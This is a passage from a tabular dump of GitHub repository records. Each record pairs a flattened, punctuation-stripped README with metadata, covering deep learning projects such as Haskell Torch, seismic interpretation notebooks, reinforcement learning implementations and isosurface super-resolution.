print it with print module and to look at print torch jit trace model input graph You can significantly clean up the latter to remove constant nodes and list operations which are rarely relevant The former tells you the parameters to every layer or at least the ones that appear and the latter is the truth about which operations actually occur and the sizes of all of the intermediate tensors That s particularly useful in conjunction with this trick x pure x Tensor TFloat KCpu 100 64 8 8 You can insert that anywhere in your pipeline to ensure that certain tensors are of a particular size GHC will then guide you to where the error is If you factor out some intermediate layers it s often best to leave the constraints on those layers to GHC instead of trying to figure them out or inserting the insane types that are currently inferred Check out T06ResNet for the residual block The inferred constraints on residualBlock are 38 lines long 1148 characters Some of these constraints are legitimate but not all This one is ok 1 stride True but 2 inH TN 2 is pointless and obviously true One day we ll be able to put these constraints in but the real issue is are the insanely long and incomprehensible ones that are legitimate outH Div inH TN 2 TN 2 TN 1 stride TN 1 TN 2 TN 2 TN 1 TN 1 We will soon have a type checker plugin to simplify these The actual constraint simplified is very readable and useful outH Div inH TN 1 stride TN 1 That s just a bit more awkward than out inH 1 stride 1 but not too terrible How do I join in the fun and contribute We d love to have more models more datasets more layers more tutorials etc Head over to one of the many big libraries that PyTorch has an port over features Two guidelines for contributing we want fast code and we want code that supports all of the options the original does Horrible code that is fast is infinitely better than elegant but slow code Refactoring in Haskell is awesome and simple so we can clean code up but every slow piece of code we have is technical debt and a showstopper for anyone that happens to depend on it Better to be upfront about not having a feature than to have a slow non replacement for that feature If you add a feature add every option that exists for that feature You will notice that our functions take a lot options Don t be shy That s life in the ML world and the only alternative is to dumb things down but then they stop being useful for serious research and development Every feature we add that is missing options is technical debt we have to pay We want people to have confidence that when the library says it does X it does it well and it does it comprehensively No surprises How does this compare feature wise to PyTorch This library includes most common features and roughly two thirds of all of the features you would find in PyTorch and torchvision We will soon reach feature parity You will find that some functions are less polymorphic and split up into several alternatives so the mapping between the two is not one to one Data loading and how networks are written is also rather different The major features unavailable at the moment are sparse tensors and a few scalar types like complex numbers They re rarely seen in the real world at the moment and the overhead of adding them in vs focusing on other features hasn t been worth it so far I have a PyTorch module how do I translate it to Haskell Torch There are two phases to this first writing the Haskell code and second transferring the weights To write the code you can print your PyTorch model to get an idea of what it contains and what important parameters exist You can also get a complete understanding of inputs outputs and operations by using the JIT You can call your module like this scriptmodule torch jit trace model args You can then print scriptmodule graph It will show you the size of all inputs outputs and intermediate results as well as every single operation and its parameters along with most constants The sizes of inputs and outputs are invaluable to helping GHC produce good error messages as you write code See the answer on how to implement models in Haskell Torch Loading the pretrained weights from PyTorch is easy but you need to be mindful of the file formats involved PyTorch provides several formats to save models we support one of them the TorchScript format It bundles code tensors see Torch StoredModel for more details but we only read back the tensors Once you trace your model as described above you can save it scriptmodule save tmp model pt You can load this model in PyTorch Look at Torch Models Vision AlexNet for an example of this and at Tutorial Intro T01Basics for more One useful PyTorch trick is that you can add extra tensors to the stored model If your model isn t producing the answer you expect it can be useful to have access to the inputs it gets at each timestep or intermediate results To do so modify your PyTorch model to add new empty parameters like self hidden nn Parameter then before you save your model assign to this parameter model hidden nn Parameter mytensor Then when you trace that tensor will be included in the trace Note that you need to update this parameter before you call trace you cannot update it in forward These models and tensors can then be loaded into Haskell to compare against your results Check out Tensor allclose I get an ambiguous type error in the middle of a computation because of broadcasting what now GHC really needs to give us a handle to such ambiguities so that we can resolve them with plugins Until then you have two types of tools Tensor like takes two tensors and returns the second unchanged while making sure that its type is like that of the former Tensor like a b returns b and makes sure its type is the same as a Second you can annotate tensors with many properties like as size see Tensor sized Tensor typed Tensor stored and similar functions Why install with Conda instead of doing everything manually or using nix Conda is the standard way to install PyTorch and related libraries if we don t go down that route we lose the ability to interoperate with the rest of the ecosystem The goal of Haskell Torch isn t to replace everything in the distant future but to try to be practical today It s not the Haskell way of managing packages but that s a small price to pay What we critically need from Haskell and GHC Haskell has five major issues that stop ML code in its tracks Haskell Torch is carefully designed to avoid some of these but part of the reason we re releasing this library is as a request plea for developers to look into these issues The initial version of Haskell Torch had a lot more type safety but we had to strip pretty much all of that out to make the library usable We could do so much more in ,2019-10-14T04:54:35Z,2019-12-08T10:41:53Z,Haskell,abarbu,User,2,2,0,18,master,abarbu,1,0,1,0,0,0,1
yanqiAI,document-image-retrieval,n/a,V1 0 1 anaconda3 5 2 0 python3 6 2 requirements txt pip install r requriements txt 3 python RetrievalMainWin py npz cnnfeatureh5 checkpointspb modelpb pb 1 2 3 cnnfeature npz 4 5top5 0 1 58 v1 00 85top51w 0 001s 10 280 4s1w,2019-10-31T10:22:36Z,2019-12-10T09:01:55Z,Python,yanqiAI,User,1,2,0,9,master,yanqiAI,1,0,0,0,0,1,0
TayfunKaraderi,MSc-Project-Deep-Learning-Applied-to-Seismic-Interpretation,n/a,ACSE 9 Project Automatic Seismic Interpretation Techniques This repository contains the presentation ACSE 9 presentation pdf final report Report pdf and the software for the ACSE 9 module This package was developped as part of an internship at Ikon Science adress 1st Floor 1 The Crescent Surbiton KT6 4BN It was supervised by Prof Olivier Dubrule and Lukas Mosser from the Imperial College London and Dr Ehsan Naeini from the Ikon Science Software This repository contains two main Jupyter notebooks FCNNotebook ipynb and SWCNotebook ipynb FCNNotebook ipynb is dedicated to fully convolutional networks and the SWCNotebook is dedicated to CNNs as part of sliding window approach to do semantic segmentation on seismic datasets In terms of performance when we trained our models with only 8 inline slices out of 401 slices in the entire seismic volume up to 98 9 pixelwise validation test accuracies were obtained using the SWC approach and up to 98 7 validation test accuracies were obtained using the FCN approach In terms of speed FCN approach is the significantly faster approach by orders of 10 3 SWCNotebook ipynb This notebook is based on the MelanoV Machine Learning of Voxels software Link https github com LukasMosser asi pytorch We have edited the original implimentation and our version of this software is provided in the Forties folder in the google drive link This software mainly contains two python files TrainModel py used to train the CNN model and predict py used to make predictions on other inline slices These predictions are saved into two different files in a user set directory of labels npy and indices npy which contains the labels and their indices on the seismic cube respectively The TrainModel py and predict py also have dependencies on four different python files of datasets py model py options py and utils py which all have several classes and functions in them but their main usages are to slice the 65x65x65 seismic cubes patches around the indices for training and predicting define the model to be used for training set the command line options and to save the checkpoints per epoch of the trained model respectively The SWCNotebook ipynb notebook makes use of this MelanoV software contained within the Forties folder to do everything from trainig to prediction to visulisation All the relevant documentation on the usage of this software is provided within the notebook Note SWCNotebook ipynb makes use of python files TrainModel py predict py datasets py model py options py and utils py in the Forties file in the shared drive link This 6 python files inside the Forties file are also copied into the SWCNotebook ipynb in the Utils section so that the code can be inspected as a whole without going through each file one by one FCNNotebook ipynb This is a self contained notebook that doesn t have any external dependencies apart from a CRF library which we install from the google drive link provided below and the standard python libraries such as numpy pandas matplotlib etc This notebook does everything from training to prediction to visulisation using FCN models four different models are provided two of them are Auto Encoders and two of them are U Net models One of the U Net models model 4 is symmetric i e padding and filter sizes adjusted such that the kernel size on the left of U Net matches that of right side and size invariant i e output segmentation map will always be same shape as input shape for any given input shape This makes model 4 applicable to any given dataset without changing anything only the number of classes parameter on top of model 4 needs to be adjusted All the relevant documentation is contained within the notebook Apart from the main two notebooks we also have two notebooks modelavarage ipynb and 3DVisualize ipynb modelavarage ipynb This is to upload the predicted cube segmentation maps from various different models approaches and model avarage those by taking the mode 3DVisualize ipynb This is contained within the Visualize 3D Cubes file in the Google drive link Visualize 3D Cubes file also contains sample predicted segmetation cubes seismic amplitudes cubes and the ground truth labellings data This enables us to visualize 3d arrays in an interactive way with sliding inlines crosslines and vertical lines as shown in the appendix of the report Requirements pip install segyio and mayavi SETUP INSTRUCTIONS 1 Download this repository or clone it Then upload the three jupyter notebooks into Google Colab 2 Open a google drive account its best to not use your personal drive Four files are shared via the below google drive link Select the files FCN Approach Forties Pydensecrf Then right click and click on add to my own drive Download the other file Visualize 3D Cubes 3 Once the three files which contain the datasets and libraries used within the FCNNotebook ipynb and SWCNotebook ipynb are in the drive connect this drive to FCNNotebook ipynb and SWCNotebook ipynb Then you should be able to load the datasets and go through the notebooks to train the models apply the models etc Environment 3DVisualize ipynb in Visualize 3D Cubes runs on Jupyter Python 3 whereas all the other notebooks run on google colab Python 3 and GPU enabled FCN Approach file contains some pre trained models for the U Net model model 3 which you can load into FCNNotebook but this isn t necessary as training time is only a few minutes It also contains some predictions from pre trained models these are used in model averaging in modelaverage ipynb Forties file contains our version of the MelanoV software and our dataset the SWCNotebook is build as a user guide to the MelanoV software and makes excessive use of Forties file for both reading files and writing files in it Pydensecrf file shared is the Krhenbhl s library for fully connected CRF models with gaussian edge potentials We copied this repository from https github com lucasb eyer pydensecrf,2019-10-05T12:12:32Z,2019-11-27T19:17:43Z,Jupyter Notebook,TayfunKaraderi,User,2,2,1,10,master,TayfunKaraderi,1,0,0,0,0,0,0
Murtuza-Chawala,Image-classification-using-Deep-Learning-CNN-in-Python,n/a,Image classification using Deep Learning CNN in Python Accuracy 74 approx Cats vs Dogs image classification deep learning CNN model built using Python Is the picture a cat or a dog Well this model is built to find out https miro medium com max 2560 1 biZq ihFzq1I6Ssjz7UtdA jpeg,2019-09-22T10:17:51Z,2019-11-15T10:17:29Z,Jupyter Notebook,Murtuza-Chawala,User,1,2,0,4,master,Murtuza-Chawala,1,0,0,0,0,0,0
neemiasbsilva,machine-learning-algorithm,n/a,Machine Learning Algorithms Googles self driving cars and robots get a lot of press but the companys real future is in machine learning the technology that enables computers to get smarter and more personal Eric Schmidt Google Chairman Implementation Details For all these techniques the following order was maintained 1 Collecting Data 2 Analysis Data 3 Data Wrabling 4 Test Train 5 Accuracy Check This repository was created for shown some algorithms of machine learning It s important you have a high leve Python to understanding of various machine learning algorithms These should be sufficient to get your hands dirty Code Environment You need use jupyter notebook and venv for run all of implementations jupyter notebook terminal Sincerely Neemias B Silva,2019-09-21T04:02:02Z,2019-11-19T01:08:32Z,Jupyter Notebook,neemiasbsilva,User,2,2,0,45,master,neemiasbsilva,1,0,0,0,0,0,1
ZhengXinyue,Deep-rl-mxnet,n/a,Deep rl mxnet Mxnet implementation of Deep Reinforcement Learning papers Now this repository contains DQN Simple implementation MountainCar v0 https github com ZhengXinyue Deep rl mxnet blob master Nature 20DQN NatureDQN py Double DQN Simple implementation MountainCar v0 https github com ZhengXinyue Deep rl mxnet blob master Double 20DQN DoubleDQN py Dueling DQN Simple implementation MountainCar v0 https github com ZhengXinyue Deep rl mxnet blob master Dueling 20DQN DuelingDQN py Policy Gradient Simple implementation CartPole v0 https github com ZhengXinyue Deep rl mxnet blob master Policy 20Gradient PolicyGradient py DDPG Detailed implementation star Pendulum v0 https github com ZhengXinyue Deep rl mxnet blob master DDPG DDPGPendulum py LunarLander v2 https github com ZhengXinyue Deep rl mxnet blob master DDPG DDPGLunarLanderv2 py PPO Simple implementation CartPole v0 https github com ZhengXinyue Deep rl mxnet blob master PPO PPOdiscrete py TD3 Very detailed implementation star star Pendulum v0 https github com ZhengXinyue Deep rl mxnet blob master TD3 TD3Pendulum py LunarLander v2 https github com ZhengXinyue Deep rl mxnet blob master TD3 TD3LunarLanderv2 py HalfCheetah v2 https github com ZhengXinyue Deep rl mxnet blob master TD3 TD3HalfCheetahv2 py In the future this will contain 1 A3C 2 SAC Requirements Python 3 OpenAI gym Mxnet gpu or cpu and gluonbook Box2d optional Mujoco optional Basic Installation pip install gym pip install gluonbook pip install mxnet cpu version pip install mxnet cu90 gpu version corresponding to your cuda version Box2d Installation Optional pip install box2d py If you get something like this unable to execute swig No such file or directory do sudo apt get install swig Mujoco Installation Optional Please refer to this repository https github com openai mujoco py Contents 1 DQN Playing Atari with Deep Reinforcement Learning https arxiv org abs 1312 5602v1 Human level control through deep reinforcement learning https www nature com articles nature14236 image https github com ZhengXinyue Deep rl mxnet blob master Nature 20DQN DQN 20MountainCar v0 png 2 Double DQN Deep Reinforcement Learning with Double Q learning https arxiv org abs 1509 06461v3 image https github com ZhengXinyue Deep rl mxnet blob master Double 20DQN Double 20DQN 20MountainCar v0 png 3 Dueling DQN Dueling Network Architectures for Deep Reinforcement Learning https arxiv org abs 1511 06581v3 image https github com ZhengXinyue Deep rl mxnet blob master Dueling 20DQN Dueling 20DQN 20MountainCar v0 png 4 Policy Gradient Policy Gradient Methods for Reinforcement Learning with Function Approximation https papers nips cc paper 1713 policy gradient methods for reinforcement learning with function approximation pdf image https github com ZhengXinyue Deep rl mxnet blob master Policy 20Gradient Policy 20Gradient png 5 Deep Deterministic Policy Gradient Continuous Control with Deep Reinforcement Learning https arxiv org abs 1509 02971 image https github com ZhengXinyue Deep rl mxnet blob master DDPG DDPGPendulum v0 png image https github com ZhengXinyue Deep rl mxnet blob master DDPG LunarLanderContinuousv2 png 6 Proximal Policy Optimization Proximal Policy Optimization Algorithms https arxiv org abs 1707 06347 Emergence of Locomotion Behaviours in Rich Environments https arxiv org abs 1707 02286 image https github com ZhengXinyue Deep rl mxnet blob master PPO PPOCartPolev0 png 7 TD3 Addressing Function Approximation Error in Actor Critic Methods https arxiv org abs 1802 09477 image https github com ZhengXinyue Deep rl mxnet blob master TD3 TD3Pendulum v0 png image https github com ZhengXinyue Deep rl mxnet blob master TD3 LunarLanderContinuousv2 png image https github com ZhengXinyue Deep rl mxnet blob master TD3 HalfCheetahv2 png 8 A3C Asynchronous Methods for Deep Reinforcement Learning https arxiv org abs 1602 01783v2 9 SAC Soft Actor Critic Off Policy Maximum Entropy Deep Reinforcement Learning with a Stochastic Actor https arxiv org abs 1801 01290v2,2019-10-30T08:43:46Z,2019-11-23T10:14:07Z,Python,ZhengXinyue,User,0,2,0,51,master,ZhengXinyue,1,0,0,0,0,0,0
MachineLearningMilan,Reinforcement-Learning-finance,n/a,Reinforcement Learning finance Meetup 10 of MLMIlan Deep dive into Reinforcement Learning Use case in Finance Acknowledgement to Gianluca De Cola AGS SpA 03 10 2019,2019-10-04T13:22:53Z,2019-11-15T15:34:51Z,Jupyter Notebook,MachineLearningMilan,User,3,2,0,4,master,MachineLearningMilan,1,0,0,0,0,0,0
oliver-austin,ELEC498-streetfighter-reinforcement-learning,n/a,This is our repository for building an agent using Deep Q Learning to play Street Fighter II Add info here as necessary git pull updates all branches git checkout name of new branch moves you to new branch git pull pull the branch your looking at Library requirements can be installed from the requirements txt file To customize the reward function the scenario json file in the retro library files must be changed The default value gives a reward based on the player s score To reward based on the difference in player s health paste the following in the reward variables object in the scenario file located at site packages retro data stable stable StreetFighterIISpecialChampionEdition Genesis scenario json health reward 1 0 enemyhealth reward 1 0,2019-09-26T18:57:32Z,2019-11-12T23:42:37Z,Python,oliver-austin,User,2,2,0,12,master,oliver-austin#tedwardmunn,2,0,0,2,0,3,2
XiaoWangya,smart-traffic,n/a,smart traffic Building an intelligent traffic control system via deep reinfocement learning,2019-10-02T06:07:16Z,2019-12-02T08:06:56Z,Python,XiaoWangya,User,1,2,0,25,master,XiaoWangya,1,0,0,0,0,0,0
blue-whale-one,AnomalyDetectionBook,n/a,AnomalyDetectionBook Code for Beginning Anomaly Detection Using Python Based Deep Learning,2019-10-26T11:08:15Z,2019-11-15T00:10:13Z,Jupyter Notebook,blue-whale-one,Organization,1,2,1,2,master,sridharalla#sidalla,2,0,0,0,0,0,0
ozloti,dl2019,n/a,,2019-09-25T12:54:22Z,2019-10-01T01:39:31Z,Jupyter Notebook,ozloti,User,1,2,0,0,master,,0,0,0,0,0,0,0
astonzhang,d2l-1day,n/a,Dive into Deep Learning in 1 Day Last updated today Information Speaker Alex Smola https alex smola org Overview Did you ever want to find out about deep learning but didn t have time to spend months New to machine learning Do you want to build image classifiers NLP apps train on many GPUs or even on many machines If you re an engineer or data scientist this course is for you This is about the equivalent of a Coursera course all packed into one day The course consists of four segments of 90 minutes each 1 Deep Learning Basics 1 Convolutional Neural Networks for computer vision 1 Best practices GPUs Parallelization Fine Tuning Transfer Learning 1 Recurrent Neural Networks for natural language RNN LSTM GRU Prerequisites You should have some basic knowledge of Linear Algebra http numpy d2l ai chapterpreliminaries scalar tensor html Calculus http numpy d2l ai chapterpreliminaries calculus html Probability http numpy d2l ai chapterpreliminaries probability html and Python https learnpythonthehardway org here s another book https www diveinto org python3 table of contents html to learn Python Moreover you should have some experience with Jupyter https jupyter org notebooks or with SageMaker http aws amazon com sagemaker notebooks To run things on multiple GPUs you need access to a GPU server such as the P2 https aws amazon com ec2 instance types p2 G3 https aws amazon com ec2 instance types g3 or P3 https aws amazon com ec2 instance types p3 instances Syllabus This course relies heavily on the Dive into Deep Learning http numpy d2l ai book There s a lot more detail in the book notebooks examples math applications The crash course will get you started For more information also see other courses and tutorials http courses d2l ai based on the book All notebooks below are availabe at d2l ai 1day notebooks https github com d2l ai 1day notebooks which contains instructions how to setup the running environments Time Topics 8 00 9 00 Setup clinic for laptops 9 00 10 30 Part 1 Deep learning basic part 1 deep learning basic 10 30 11 00 Coffee break 11 00 12 30 Part 2 Convolutional neural networks part 2 convolutional neural networks 12 30 2 00 Lunch break 2 00 3 30 Part 3 Performance part 3 performance 3 30 4 00 Coffee break 4 00 5 30 Part 4 Recurrent neural networks part 4 recurrent neural networks Part 1 Deep Learning Basic Slides keynote slides Part 1 key pdf slides Part 1 pdf Notebooks 1 Data Manipulation with Ndarray ipynb https github com mli d2l 1day notebooks blob master notebooks 1 1 ndarray ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 1 1 ndarray ipynb 1 Automatic Differentiation ipynb https github com mli d2l 1day notebooks blob master notebooks 1 2 autograd ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 1 2 autograd ipynb 1 Linear Regression Implementation from Scratch ipynb https github com mli d2l 1day notebooks blob master notebooks 1 3 linear regression scratch ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 1 3 linear regression scratch ipynb 1 Concise Implementation of Linear Regression ipynb https github com mli d2l 1day notebooks blob master notebooks 1 4 linear regression gluon ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 1 4 linear regression gluon ipynb 1 Image Classification Data Fashion MNIST ipynb https github com mli d2l 1day notebooks blob master notebooks 1 5 fashion mnist ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 1 5 fashion mnist ipynb 1 Implementation of Softmax Regression from Scratch ipynb https github com mli d2l 1day notebooks blob master notebooks 1 6 softmax regression scratch ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 1 6 softmax regression scratch ipynb 1 Concise Implementation of Softmax Regression ipynb https github com mli d2l 1day notebooks blob master notebooks 1 7 softmax regression gluon ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 1 7 softmax regression gluon ipynb 1 Implementation of Multilayer Perceptron from Scratch ipynb https github com mli d2l 1day notebooks blob master notebooks 1 8 mlp scratch ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 1 8 mlp scratch ipynb 1 Concise Implementation of Multilayer Perceptron ipynb https github com mli d2l 1day notebooks blob master notebooks 1 9 mlp gluon ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 1 9 mlp gluon ipynb Part 2 Convolutional neural networks Slides keynote slides Part 2 key pdf slides Part 2 pdf Notebooks 1 GPUs ipynb https github com mli d2l 1day notebooks blob master notebooks 2 1 use gpu ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 2 1 use gpu ipynb 1 Convolutions ipynb https github com mli d2l 1day notebooks blob master notebooks 2 2 conv layer ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 2 2 conv layer ipynb 1 Pooling ipynb https github com mli d2l 1day notebooks blob master notebooks 2 3 pooling ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 2 3 pooling ipynb 1 Convolutional Neural Networks LeNet ipynb https github com mli d2l 1day notebooks blob master notebooks 2 4 lenet ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 2 4 lenet ipynb 1 Deep Convolutional Neural Networks AlexNet ipynb https github com mli d2l 1day notebooks blob master notebooks 2 5 alexnet ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 2 5 alexnet ipynb 1 Networks Using Blocks VGG ipynb https github com mli d2l 1day notebooks blob master notebooks 2 6 vgg ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 2 6 vgg ipynb 1 Inception Networks GoogLeNet ipynb https github com mli d2l 1day notebooks blob master notebooks 2 7 googlenet ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 2 7 googlenet ipynb 1 Residual Networks ResNet ipynb https github com mli d2l 1day notebooks blob master notebooks 2 8 resnet ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 2 8 resnet ipynb Part 3 Performance Slides keynote slides Part 3 key pdf slides Part 3 pdf Notebooks 1 A Hybrid of Imperative and Symbolic Programming ipynb https github com mli d2l 1day notebooks blob master notebooks 3 1 hybridize ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 3 1 hybridize ipynb 1 Multi GPU Computation Implementation from Scratch ipynb https github com mli d2l 1day notebooks blob master notebooks 3 2 multiple gpus ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 3 2 multiple gpus ipynb 1 Concise Implementation of Multi GPU Computation ipynb https github com mli d2l 1day notebooks blob master notebooks 3 3 multiple gpus gluon ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 3 3 multiple gpus gluon ipynb 1 Fine Tuning ipynb https github com mli d2l 1day notebooks blob master notebooks 3 4 fine tuning ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 3 4 fine tuning ipynb Part 4 Recurrent neural networks Slides keynote slides Part 4 key pdf slides Part 4 pdf Notebooks 1 Text Preprocessing ipynb https github com mli d2l 1day notebooks blob master notebooks 4 1 text preprocessing ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 4 1 text preprocessing ipynb 1 Implementation of Recurrent Neural Networks from Scratch ipynb https github com mli d2l 1day notebooks blob master notebooks 4 2 rnn scratch ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 4 2 rnn scratch ipynb 1 Concise Implementation of Recurrent Neural Networks ipynb https github com mli d2l 1day notebooks blob master notebooks 4 3 rnn gluon ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 4 3 rnn gluon ipynb 1 Gated Recurrent Units GRU ipynb https github com mli d2l 1day notebooks blob master notebooks 4 4 gru ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 4 4 gru ipynb 1 Long Short Term Memory LSTM ipynb https github com mli d2l 1day notebooks blob master notebooks 4 5 lstm ipynb slides https nbviewer jupyter org format slides github mli d2l 1day notebooks blob master notebooks 4 5 lstm ipynb,2019-10-24T22:38:23Z,2019-10-30T13:03:39Z,Shell,astonzhang,User,2,2,4,12,master,astonzhang,1,0,0,1,0,1,0
KSXGroup,ALBERT,n/a,A Lite BERT Toy Version This version of ALBERT is a toy version for Deep Learning Course Project No pre trained weights provided No data parallel or gpu support provided Model size much smaller than the origin paper ALBERTBASE Some code copy from others Clone and modification is welcomed However still under development,2019-10-27T08:04:17Z,2019-11-08T06:20:03Z,Python,KSXGroup,User,1,2,0,0,master,,0,0,0,0,0,0,0
vandit15,TF2-scripts,deep-learning#machine-learning#tensorflow#tensorflow-examples#tensorflow2#tf2,TF2 scripts Scripts related to deep learning written using tensorflow 2 0 Introduction The goal of this repository is to have a library of frequently used scripts related to deep learning This can include data handling models loss functions among other valuable parts that are used in building a deep learning model Contents resnet https arxiv org abs 1512 03385 The script contains implementation of resnet18 resnet50 resnet101 and resnet152 Contribution If anyone wants to has shifted to tensorflow 2 https www tensorflow org apidocs python tf and wants to contribute to the repository please send a pull https github com vandit15 TF2 scripts pulls request,2019-10-09T12:05:14Z,2019-10-16T07:35:11Z,Python,vandit15,User,1,2,0,6,master,vandit15,1,0,0,0,0,0,0
huydang90,Hertie-School-Data-Science-Society,n/a,Hertie School Data Science Society The Hertie School of Governance is an international education and research centre of excellence located in cosmopolitan Berlin With the mission to prepare students for future leadership positions in government business and civil society institutions The Hertie School gives special attention to the complex impact of digitalization and technological advancement on society at large Data Science Society is a student led initiative within the school to build a strong and vibrant community of enthusiasts data geeks and experts who enjoy learning and sharing knowledge in the field of Machine Learning Deep Learning and Artificial Intelligence and their application for public policy alt text https raw githubusercontent com huydang90 Hertie School Data Science Society master images Screen 20Shot 202019 10 01 20at 208 10 57 20PM png,2019-10-01T18:05:07Z,2019-12-02T10:58:49Z,HTML,huydang90,User,3,2,1,17,master,huydang90,1,0,0,0,0,0,0
Zartris,DRL-project,n/a,Deep reinforcement learning projects This is my course repository where I put my notes on each subject within reinforcement learning and deep reinforcement learning Within the DRL course folder you find all the small projects I have solved and a note folder The note folder is for the notes I use to remember and foremost to better learn the underlying subjects Feel free to read the notes and take inspiration but if you do i cannot promis how beautiful it looks unless you use Typora https www typora io since this is what i wrote them in The notes are mainly from the course Deep reinforcement learning nanodegree from udacity but also the book Grokking Deep Reinforcement Learning https www manning com books grokking deep reinforcement learning I would highly recommend this book as it is both very informing but also entertaining to read So give this a chance and you won t regret it,2019-10-01T08:45:47Z,2019-12-13T12:20:55Z,Jupyter Notebook,Zartris,User,1,2,0,79,master,Zartris,1,0,0,0,0,0,0
dair-iitd,dl-with-constraints,n/a,Primal Dual Formulation for Deep Learning with Constraints This repo contains code and data whereever possible used for replicating experiments in our Neurips 2019 paper Primal Dual Formulation For Deep Learning With Constraints We applied our algorithm on three different problems Semantic Role Labeling Named Entity Recognition and Fine Grained Entity Typing Instructions to run the code for them are in their respective folders srl ner and typenet,2019-10-21T07:40:29Z,2019-12-02T04:54:52Z,Python,dair-iitd,Organization,3,2,2,30,master,ynandwan#djin31,2,0,0,0,0,0,0
RuudFirsa,Graph-GEN,n/a,Graph GEN This project contains the code used for the generation of graphs using the published method Deep Generative Model for Sparse Graphs using Text Based Learning with Augmentation in Generative Examination Networks https arxiv org abs 1909 11472 GEN Framework GENexplained png Reference Please refer to the archive when using any file thereof Please cite the following publication Ruud van Deursen and Guillaume Godin Deep Generative Model for Sparse Graphs using Text Based Learning with Augmentation in Generative Examination Networks https arxiv org abs 1909 11472 License The code is freely available under a Clause 3 BSD license https opensource org licenses BSD 3 Clause Dependencies Python 3 6 RDKit Keras Tensorflow Numpy Scipy IPython Matplotlib Notification The current version partially inherits functionality from RDKit rdkit org Time permitted this dependency will be resolved with a new LGI writer and LGI reader for networkx Graph,2019-09-23T06:42:46Z,2019-09-29T13:01:52Z,Python,RuudFirsa,User,1,2,0,6,master,RuudFirsa,1,0,0,0,0,0,0
gautamkumarjaiswal,Ground-Truth-Generation,n/a,Ground Truth Generation An Image Processing Tool to Generate Ground Truth Data from Satellite Images using DeepLearning Download complete folder and install all packages from requirements txt However all libraries listed in requirements txt is not required If you have memory issue with your system then install manually else install all using pip install r requirements txt To train model from scratch run trainModel py To test trained model run testDBimage py This will select test images from database and generate result To test with random satellite image run testrandomimage py For more detail please read article published at Medium https towardsdatascience com an image processing tool to generate ground truth data from satellite images using deep learning f9fd21625f6c,2019-09-25T11:13:24Z,2019-10-23T03:30:07Z,Python,gautamkumarjaiswal,User,1,2,1,6,master,gautamkumarjaiswal,1,0,0,1,0,1,1
aidlearning,AidLux,n/a,AidLux Linux running on the Android for Deep Learning with Gui and Python support based AidLearning Framework https github com aidlearning AidLearning Framework,2019-09-30T00:48:50Z,2019-11-20T02:16:08Z,n/a,aidlearning,User,1,2,0,2,master,aidlearning,1,0,0,0,0,0,0
shamanDevel,IsosurfaceSuperresolution,n/a,Volumetric Isosurface Rendering with Deep Learning Based Super Resolution This repository contains the code accompaning the TVCG submission Requirements The code was written under Windows 10 with Visual Studio and CUDA 10 0 and Python 3 6 For the python requirements see SuperresolutioNetworkRequirements txt The network will run probably platform independently but the isosurface renderer is most likely fixed to Windows Use it on other platforms on your own risk Note for the sake of a smaller repository we only added the third party libraries for a release build and excluded the debug build Project structure The project contains the following sub project CopyLibraries utility that copies dlls from the third party folders to the binary folder CPURenderer cpu isosurface renderer callable from command line or interactive over streans GPURenderer cuda isosurface renderer callable from command line or interactive over streans GPURendererDirect cuda isosurface renderer but build as a shared library to be included directly in Python DataGenerator python projects with scripts to generate the training data SuperresolutionNetwork the python project with the network specification dataset generation and loading training and interactive inference All files prefixed with main are executable python scripts mainVideo py training code for the Shaded network mainVideoUnshaded py training code for the unshaded networks networks on the geometry normals with shading in post process mainDatasetViewer py simple GUI to view the dataset mainGUI py interactive GUI to explore the datasets and different networks Depends on GPURendererDirect mainComparisonImages py mainComparisonVideo1 2 3 py scripted benchmarks and video creation mainPSNR1 2 3 4 py scripts used to create the statistics reported in the paper How to use it The mainGUI py can be directly launched without command line arguments It opens a window and allows you to select the volume to render and the networks to use mainVideoUnshaded py is the main training code All network and training parameters are specified via command line For example these are the arguments used to train our best performing network python3 mainVideoUnshaded py dataset cloud video inputPathUnshaded allejecta txt numberOfImages 1 model EnhanceNet losses l1 mask 1 l1 ao 1 l1 normal 10 l1 depth 10 temp l2 color 0 1 lossAO 0 0 lossAmbient 0 1 lossDiffuse 0 9 initialImage zero samples 5000 batchSize 16 testBatchSize 16 nEpochs 1000 lr 0 0001 lrStep 100 logdir logdirvideo2 modeldir modeldirvideo2 pretrained pretrained genl1normalDepth2 pth cuda Datasets and binary releases Volume datasets prerendered data for the training and pretrained networks can be found under Releases License This software excluding third party libraries is distributed under the MIT open source license See LICENSE for details,2019-10-14T07:20:43Z,2019-11-26T07:09:43Z,Python,shamanDevel,User,1,2,0,1,master,shamanDevel,1,1,1,0,0,0,0
